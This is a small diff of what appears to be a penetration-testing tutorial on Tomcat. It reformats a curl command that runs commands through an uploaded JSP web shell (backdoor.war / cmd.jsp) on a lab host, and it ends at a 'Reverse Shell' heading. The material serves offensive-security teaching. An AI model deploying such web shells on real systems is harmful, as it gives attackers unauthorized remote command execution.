@@ -112,7 +112,7 @@ zip -r backdoor.war cmd.jsp
 
 This file is uploaded to the manager GUI, after which the `/backdoor` application will be added to the table.
 
-[!bash!]$ curl http://web01.inlanefreight.local:8180/backup/backdoor.jsp?cmd=id
+`[!bash!]$ curl http://web01.inlanefreight.local:8180/backup/backdoor.jsp?cmd=id`
 
 **Reverse Shell**
 
